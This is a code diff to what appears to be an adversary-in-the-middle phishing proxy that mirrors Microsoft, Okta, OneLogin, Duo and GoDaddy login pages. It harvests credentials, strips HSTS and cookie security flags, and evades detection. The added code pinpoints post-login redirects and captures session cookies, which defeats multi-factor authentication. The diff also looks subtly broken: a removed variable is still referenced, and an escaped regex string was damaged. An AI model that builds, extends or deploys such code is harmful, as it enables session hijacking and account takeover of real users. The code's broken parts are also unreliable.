@@ -48,6 +48,45 @@ const CRITICAL_AUTH_COOKIES = {
   godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
 };
 
+// NEW: Define post-login URL patterns to detect successful authentication
+const POST_LOGIN_PATTERNS = {
+  microsoft: [
+    '/common/oauth2/authorize',
+    '/common/oauth2/v2.0/authorize',
+    '/common/login',
+    '/common/SAS/ProcessAuth',
+    '/common/federation/oauth2',
+    '/kmsi',
+    '/common/DeviceAuthTls',
+    '/common/login/user'
+  ],
+  okta: [
+    '/oauth2/v1/authorize',
+    '/oauth2/default/v1/authorize',
+    '/login/sessionCookieRedirect',
+    '/auth/services/devicefingerprint',
+    '/api/v1/authn',
+    '/sso/idps'
+  ],
+  onelogin: [
+    '/access/idp',
+    '/access/oidc',
+    '/trust/openid-connect/v2',
+    '/session'
+  ],
+  duo: [
+    '/frame/prompt',
+    '/frame/web/v1/auth',
+    '/auth/v2/auth'
+  ],
+  godaddy: [
+    '/authenticate',
+    '/login/authenticate',
+    '/v1/sso/authenticate',
+    '/account/session'
+  ]
+};
+
 const UPSTREAM_CONTEXT = {
   currentDomain: null,
   currentPath: null
@@ -172,10 +211,55 @@ function hasCriticalAuthCookies(cookieString, platform) {
   });
 }
 
+// NEW: Check if current request is a post-login/auth endpoint
+function isPostLoginEndpoint(path, platform) {
+  const patterns = POST_LOGIN_PATTERNS[platform] || [];
+  return patterns.some(pattern => path.toLowerCase().includes(pattern.toLowerCase()));
+}
+
+// NEW: Check if response indicates successful login (redirect to app/success)
+function isSuccessfulAuthRedirect(status, location, platform) {
+  if (![301, 302, 303, 307, 308].includes(status)) return false;
+  if (!location) return false;
+
+  // Check if redirecting to application (not back to login)
+  const lowerLoc = location.toLowerCase();
+
+  // Microsoft: redirect to app or code/token
+  if (platform === 'microsoft') {
+    return lowerLoc.includes('code=') || 
+           lowerLoc.includes('access_token=') || 
+           lowerLoc.includes('id_token=') ||
+           (!lowerLoc.includes('login.microsoftonline.com') && 
+            !lowerLoc.includes('login.live.com') &&
+            !lowerLoc.includes('reprocess'));
+  }
+
+  // Okta: redirect to app or session established
+  if (platform === 'okta') {
+    return lowerLoc.includes('sessionToken') || 
+           lowerLoc.includes('fromURI') ||
+           (!lowerLoc.includes('okta.com/login') && 
+            !lowerLoc.includes('okta.com/auth'));
+  }
+
+  // GoDaddy: redirect to dashboard/app
+  if (platform === 'godaddy') {
+    return lowerLoc.includes('account') || 
+           lowerLoc.includes('dashboard') ||
+           lowerLoc.includes('products') ||
+           (!lowerLoc.includes('login') && 
+            !lowerLoc.includes('authenticate'));
+  }
+
+  // Generic: redirect away from auth domain
+  return !shouldProxyDomain(new URL(location).hostname);
+}
+
 function parseCredentials(bodyText) {
   let user = null;
   let pass = null;
-  
+
   if (!bodyText) return { user, pass };
 
   try {
@@ -302,7 +386,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
     if ('srcset' in HTMLImageElement.prototype) {
       const originalSrcset = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'srcset') 
         || { get: function() { return this.getAttribute('srcset'); }, set: function(v) { this.setAttribute('srcset', v); }};
-      
+
       Object.defineProperty(HTMLImageElement.prototype, 'srcset', {
         get: function() { return originalSrcset.get.call(this); },
         set: function(value) {
@@ -419,7 +503,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
               }
             }
           }
-          
+
           mutation.addedNodes.forEach(function(node) {
             if (node.nodeType === 1) {
               try {
@@ -430,7 +514,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
                     console.log('[Proxy Interceptor] Rewrote node src:', newSrc);
                   }
                 }
-                
+
                 if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !node.href.startsWith('#')) {
                   const newHref = rewriteUrl(node.href);
                   if (newHref !== node.href) {
@@ -438,7 +522,7 @@ function generateInterceptorScript(upstreamDomain, currentPath) {
                     console.log('[Proxy Interceptor] Rewrote node href:', newHref);
                   }
                 }
-                
+
                 if (node.style && node.style.cssText) {
                   const newCss = node.style.cssText.replace(/url\\(["']?([^"')]+)["']?\\)/g, (match, url) => {
                     const newUrl = rewriteUrl(url);
@@ -560,7 +644,7 @@ export default async function handleRequest(request) {
 
   // CRITICAL FIX: Build headers carefully to avoid detection
   const headers = new Headers();
-  
+
   // Copy important headers from original request
   const originalUA = request.headers.get('user-agent');
   const originalAccept = request.headers.get('accept');
@@ -568,7 +652,7 @@ export default async function handleRequest(request) {
   const originalAcceptEnc = request.headers.get('accept-encoding');
   const originalCookie = request.headers.get('cookie');
   const originalContentType = request.headers.get('content-type');
-  
+
   // Set required headers - use original UA if available, else generic Chrome
   headers.set('User-Agent', originalUA || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
   headers.set('Accept', originalAccept || 'application/json, text/plain, */*');
@@ -577,17 +661,17 @@ export default async function handleRequest(request) {
   headers.set('Host', upstreamDomain);
   headers.set('Referer', `https://${upstreamDomain}/`);
   headers.set('Origin', `https://${upstreamDomain}`);
-  
+
   // Only set Content-Type if present in original
   if (originalContentType) {
     headers.set('Content-Type', originalContentType);
   }
-  
+
   // Copy cookies if present (important for session continuity)
   if (originalCookie) {
     headers.set('Cookie', originalCookie);
   }
-  
+
   // Copy X-Requested-With if present (indicates AJAX)
   const xrw = request.headers.get('x-requested-with');
   if (xrw) headers.set('X-Requested-With', xrw);
@@ -675,9 +759,12 @@ export default async function handleRequest(request) {
 
     console.log(`[DEBUG] Upstream response status: ${resp.status}`);
 
+    // Check for successful auth redirect
+    const location = resp.headers.get('Location');
+    const isAuthSuccess = isSuccessfulAuthRedirect(resp.status, location, info.type);
+
     if ([301, 302, 303, 307, 308].includes(resp.status)) {
-      const loc = resp.headers.get('Location');
-      if (loc) {
+      if (location) {
         const newHeaders = new Headers(resp.headers);
         const newLoc = rewriteLocation(loc);
 
@@ -699,34 +786,41 @@ export default async function handleRequest(request) {
     newHeaders.delete('strict-transport-security');
 
     const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
+
+    // UPDATED: Only capture cookies if:
+    // 1. It's a POST to a post-login endpoint, OR
+    // 2. Response indicates successful auth (redirect with tokens/codes), OR  
+    // 3. Response contains critical auth cookies AND is a successful auth redirect
     let shouldCaptureCookies = false;
     let cookieStr = '';
 
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
-      const isPost = request.method === 'POST';
-      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
-      shouldCaptureCookies = isPost || hasAuth;
+      const hasAuthCookies = hasCriticalAuthCookies(cookieStr, info.type);
+      const isPostLogin = request.method === 'POST' && isPostLoginEndpoint(info.path, info.type);
+
+      // Only capture if we're in a post-login flow or successful auth
+      shouldCaptureCookies = isPostLogin || (isAuthSuccess && hasAuthCookies);
+
+      if (shouldCaptureCookies) {
+        console.log(`[COOKIE CAPTURE] Post-login: ${isPostLogin}, AuthSuccess: ${isAuthSuccess}, HasAuthCookies: ${hasAuthCookies}`);
+      }
 
       cookies.forEach(c => {
         if (!c) return;
         let mod = c.replace(/Domain=[^;]+;?/gi, '');
         mod = mod.replace(/Secure;?/gi, '');
         mod = mod.replace(/SameSite=[^;]+;?/gi, '');
-        
+
         // CRITICAL FIX: Rewrite cookie paths to match proxy URL structure
-        // Microsoft sets paths like /common, /login, /etc which need to be
-        // rewritten to /_p/login.microsoftonline.com/common etc.
         if (mod.includes('Path=')) {
           mod = mod.replace(/Path=([^;]+)/i, (match, path) => {
-            // path includes leading slash (e.g., "/" or "/common")
             return `Path=${PROXY_PREFIX}${upstreamDomain}${path}`;
           });
         } else {
-          // If no Path attribute, add default path scoped to this upstream
           mod += `; Path=${PROXY_PREFIX}${upstreamDomain}/`;
         }
-        
+
         mod += '; SameSite=None; Secure';
         newHeaders.append('Set-Cookie', mod);
       });
@@ -755,7 +849,7 @@ export default async function handleRequest(request) {
 
       Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
         const escaped = domain.replace(/\./g, '\\.');
-        const regex = new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'gi');
+        const regex = new RegExp('https?://' + escaped + '([^"'`\\s)]*)', 'gi');
         text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
       });
 
@@ -764,7 +858,7 @@ export default async function handleRequest(request) {
           if (path.startsWith('_p/') || path.startsWith('data:')) return match;
           return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + ')';
         });
-        
+
         text = text.replace(/srcset=["']([^"']+)["']/gi, (match, srcset) => {
           const urls = srcset.split(',').map(part => {
             const [url, descriptor] = part.trim().split(/\s+/);
@@ -823,7 +917,7 @@ export default async function handleRequest(request) {
       if (ct.includes('text/css')) {
         text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, 
           'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1)');
-        
+
         const cssCurrentDir = info.path.replace(/\/[^\/]*$/, '/');
         text = text.replace(/url\(["']?([^\/"')][^"')]*)["']?\)/gi, (match, path) => {
           if (path.startsWith('http') || path.startsWith('data:')) return match;
@@ -841,7 +935,7 @@ export default async function handleRequest(request) {
           } catch(e) {}
           return match;
         });
-        
+
         text = text.replace(/action="\/([^"]*)"/gi, 
           `action="https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$1"`);
         text = text.replace(/action='\/([^']*)'/gi, 
